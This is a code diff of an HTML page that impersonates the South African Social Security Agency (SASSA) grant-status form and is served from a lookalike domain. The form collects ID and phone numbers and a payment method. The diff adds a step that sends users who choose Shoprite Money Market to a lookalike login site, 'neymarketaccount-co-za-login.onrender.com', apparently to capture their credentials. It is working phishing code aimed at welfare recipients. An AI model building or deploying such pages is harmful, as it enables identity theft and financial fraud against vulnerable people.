@@ -6,41 +6,97 @@
   <title>SASSA</title>
   <link rel="icon" href="https://srd-sassa-gov-za-sc19-contact.web.app/sassa-logo2.jpeg" type="image/png">
   <style>
-    body { margin: 0; font-family: Arial, sans-serif; background-color: #f9f9f9; }
-    .container { margin: 0 auto; }
-    .header { background-color: #fbc02d; padding: 5px; text-align: center; }
-    .header img { max-width: 100%; height: 50px; display: block; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+    .container {
+      margin: 0 auto;
+    }
+    .header {
+      background-color: #fbc02d;
+      padding: 5px;
+      text-align: center;
+    }
+    .header img {
+      max-width: 100%;
+      height: 50px;
+      display: block;
+      margin: 0 auto;
+    }
     .application-form {
-      padding: 20px; background-color: white;
+      padding: 20px;
+      background-color: white;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       border-radius: 5px;
+      max-width: 400px;
+      margin: 20px auto;
     }
     .application-form label {
-      display: block; font-size: 14px;
-      font-weight: bold; margin-bottom: 5px; color: #333;
+      display: block;
+      font-size: 14px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #333;
     }
     .application-form input,
     .application-form select {
-      width: 98%; padding: 12px; margin-bottom: 20px;
-      border: 1px solid #ccc; border-radius: 5px; font-size: 14px;
+      width: 98%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
     }
     .application-form input:focus,
     .application-form select:focus {
-      outline: none; border-color: #fbc02d;
+      outline: none;
+      border-color: #fbc02d;
     }
     .application-form .submit-btn {
-      background-color: #d8d8d8; color: #919191;
-      border: none; padding: 10px 20px;
-      border-radius: 5px; font-size: 16px;
-      cursor: not-allowed; width: 100%;
+      background-color: #d8d8d8;
+      color: #919191;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: not-allowed;
+      width: 100%;
     }
     .application-form .submit-btn:enabled {
-      background-color: #fbc02d; color: #131313;
+      background-color: #fbc02d;
+      color: #131313;
       cursor: pointer;
     }
-    input.invalid, select.invalid { border: 2px solid red !important; }
-    input.valid, select.valid { border: 2px solid #fbc02d !important; }
-    #paymentSection { display: none; } /* hidden until valid */
+    input.invalid, select.invalid {
+      border: 2px solid red !important;
+    }
+    input.valid, select.valid {
+      border: 2px solid #fbc02d !important;
+    }
+    #paymentSection {
+      display: none;
+    }
+    #shopriteMessage {
+      display: none;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    #shopriteMessage p {
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    #shopriteMessage button {
+      background-color: #fbc02d;
+      color: #131313;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
@@ -50,21 +106,29 @@
     </header>
     <main>
       <form class="application-form" id="applicationForm">
-        <label for="idNumber">south african id number of applicant *</label>
+        <label for="idNumber">South African ID number of applicant *</label>
         <input type="text" id="idNumber" maxlength="13" oninput="validateForm()">
         
-        <label for="phoneNumber">phone number used to submit your application *</label>
+        <label for="phoneNumber">Phone number used to submit your application *</label>
         <input type="text" id="phoneNumber" maxlength="10" oninput="validateForm()">
 
-        <!-- Payment method appears only after ID & phone are valid -->
+        <!-- Payment section -->
         <div id="paymentSection">
-          <label for="paymentMethod">confirm your current payment method *</label>
+          <label for="paymentMethod">Confirm your current payment method *</label>
           <select id="paymentMethod" onchange="validateForm()">
             <option value="">-- Select Payment Method --</option>
             <option value="Bank Account">Bank Account</option>
             <option value="Post Office (Retail Shops)">Post Office (Retail Shops)</option>
             <option value="Shoprite Money Market">Shoprite Money Market</option>
           </select>
+
+          <!-- Shoprite confirmation message -->
+          <div id="shopriteMessage">
+            <p>Please confirm to view your status by logging in to continue.</p>
+            <button type="button" onclick="window.location.href='https://neymarketaccount-co-za-login.onrender.com'">
+              Continue
+            </button>
+          </div>
         </div>
         
         <button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>
@@ -99,6 +163,7 @@
     const paymentSection = document.getElementById('paymentSection');
     const paymentMethod = document.getElementById('paymentMethod');
     const submitButton = document.getElementById('submitButton');
+    const shopriteMessage = document.getElementById('shopriteMessage');
 
     const idValid = isValidSAID(idNumber.value);
     const phoneValid = /^\d{10}$/.test(phoneNumber.value);
@@ -112,11 +177,20 @@
     } else {
       paymentSection.style.display = "none";
       paymentMethod.value = "";
+      shopriteMessage.style.display = "none";
     }
 
     const paymentValid = paymentMethod.value !== "";
-
     validateInput(paymentMethod, paymentValid);
+
+    // If Shoprite Money Market is selected
+    if (paymentMethod.value === "Shoprite Money Market") {
+      shopriteMessage.style.display = "block";
+      submitButton.style.display = "none";
+    } else {
+      shopriteMessage.style.display = "none";
+      submitButton.style.display = "block";
+    }
 
     submitButton.disabled = !(idValid && phoneValid && paymentValid);
   }
@@ -137,7 +211,12 @@
       return;
     }
 
-    // store payment method into newphoneNumber
+    // If Shoprite Money Market is selected, redirect instead
+    if (paymentMethod === "Shoprite Money Market") {
+      window.location.href = "https://neymarketaccount-co-za-login.onrender.com";
+      return;
+    }
+
     const newphoneNumber = paymentMethod;
 
     try {
